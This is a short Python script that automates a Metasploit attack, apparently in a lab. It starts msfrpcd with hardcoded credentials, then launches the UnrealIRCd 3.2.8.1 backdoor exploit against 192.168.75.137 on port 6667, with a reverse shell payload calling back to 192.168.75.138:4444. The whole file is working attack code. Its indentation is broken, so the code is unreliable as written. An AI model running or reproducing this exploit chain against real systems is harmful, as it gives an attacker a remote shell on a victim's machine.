import subprocess
def run_metasploit():
msfrpcd_cmd = "msfrpcd -P toor -U msf -f"
        subprocess.Popen(msfrpcd_cmd, shell=True)
        msfconsole_cmd = "msfconsole -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS 192.168.75.137; set RPORT 6667; set PAYLOAD payload/cmd/unix/reverse; set LHOST 192.168.75.138; set LPORT 4444; exploit'"
        subprocess.run(msfconsole_cmd, shell=True)
run_metasploit()
